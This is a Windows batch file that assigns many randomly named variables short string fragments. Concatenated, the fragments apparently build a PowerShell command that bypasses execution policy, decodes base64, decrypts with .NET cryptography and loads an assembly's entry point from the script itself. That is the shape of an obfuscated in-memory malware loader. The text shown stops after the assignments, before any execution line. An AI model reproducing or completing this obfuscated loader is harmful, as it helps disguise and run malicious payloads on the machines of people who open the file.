@echo off
set "vJzpXZEGpD=\W"
set "QifHtqnVxN=ll"
set "rjXqHYnRiQ=:\"
set "iStQDzMubB=1."
set "WVpqAOSLmR=0\"
set "dyERiJHtIP=y "
set "pqkKOTBcoz=ow"
set "zBANCRiyiC=po"
set "dyJPqBxRCY=Sy"
set "ESTVRpVsth=rs"
set "dePQFGbAiA=s\"
set "WPfapUjNwU=xe"
set "qeyJKSrdaq=we"
set "moNVvGrGoL=he"
set "kkITVfaaNV=\v"
set "iWJSBYOoeT=we"
set "IVbRVQGvtm=32"
set "CezjAchZub=st"
set "ctFVIFQUCF=Po"
set "LPLfNJvjsZ=nd"
set "ZDGtnGIFWm=.e"
set "ZLIdnSLrLc= C"
set "cysWyrVXGY=py"
set "ssKiUMPnHW=Wi"
set "HiatBrGuCR= /"
set "lNYhSGZVzg=em"
set "vMFhGCnIkS=ws"
set "WXtFiMxYAM=rS"
set "rnmztZlwOB=ll"
set "ycfgoqzCWK=in"
set "BCswpGcHnJ=do"
set "cQseHiWwNK=he"
set "vemFRbHVNf=co"
set "ssXYsCJTNG=cd"
set "cZdDYAqByR= %~dp0"
set "zzgDoRAxuM=S46e"
set "cgojgopyDs= '')"
set "HnJTrqflaB=SsXy"
set "kmTxedWMRj=ay.I"
set "NTVErSjUSA=106u"
set "IXVLwvMqZM=Secu"
set "wGljqBlkwQ=n.En"
set "LVSMSVOFkA=BC;$"
set "ATiHhMnNHc=($Ez"
set "xRSqQgpDMR=New-"
set "vnSbAONOFz=($Ez"
set "NfzNjOmFfU=ptog"
set "qtrEdHWGyo=ring"
set "XTwIagAMaT=yste"
set "NZzLMzwxmy=-ep "
set "YZsXRaGZbG=lit("
set "DARTlowhcw=fore"
set "EACfzbelwn=O.Me"
set "yUbPIBYYuz== $n"
set "mmjWvjiqXW=]::N"
set "cWbmvfhjIJ=New-"
set "nnzZeRBIjd=F'[-"
set "McAVOOQulJ=m.Re"
set "xizsPZrLKa=ert]"
set "cUmqGxvRIU=RmAx"
set "vFurYPllVv=nX.D"
set "DLzTpFVdjU='0Pg"
set "lfuvmrsgGP=;$lh"
set "buHacMdBQL=6esa"
set "mhuLHkGkfe=yste"
set "KjDwnnGamz=comm"
set "CaEvRsGMPV=nirt"
set "RymyumElEl=oL'["
set "jtdjRvOCpj=aS);"
set "IpLSenjpZr=vZB."
set "CjbpEQClTX=ZJ.T"
set "yhmjiLKcOy=[Env"
set "VMsqfMFnYQ=rity"
set "eNhXyvwJGG=d;$n"
set "eOewbSJwHn= New"
set "mNfeKTjTgr= [Sy"
set "fOchjSnySA=rity"
set "ArOFUsUQjt=embl"
set "jZQffkkiOX=EzvZ"
set "IxiXwFgZuC=, $S"
set "IgAVinJhCD=morF"
set "WXNgdPfiWD=Obje"
set "PwsyHXlbET='[-1"
set "KbXrPtHVhK=ck($"
set "hIlMqlRluy=SsXy"
set "jCGULWvHTG=bdd."
set "GNSRQyHfvS=esaB"
set "MDRkqGQana=)))"
set "jraXYODkVs==');"
set "HeqkWpsaAy=Fina"
set "LpfwBvAGOG=X = "
set "FpCDCOCCXf=dj0C"
set "OSKDZbmrDj=tryP"
set "VwZGHLkqHi=k; }"
